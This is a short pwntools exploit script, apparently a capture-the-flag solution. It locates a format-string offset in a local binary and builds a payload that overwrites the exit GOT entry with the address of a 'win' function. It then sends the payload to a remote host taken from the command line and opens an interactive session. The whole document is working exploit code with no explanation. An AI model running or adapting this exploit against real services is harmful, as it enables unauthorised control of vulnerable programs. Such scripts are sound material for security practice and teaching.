from pwn import *

elf = context.binary = ELF("notspecified")
context.log_level = 'debug'  

got_exit = 0x404048
win = elf.sym.win

def exec_fmt(payload):
    p = process(elf.path)
    p.sendlineafter(b"username", payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
log.success(f"Format string offset found: {offset}")

payload = fmtstr_payload(offset, {got_exit: win})

p = remote(*(sys.argv[1].split(":")))
p.sendlineafter(b"username", payload)
p.interactive()

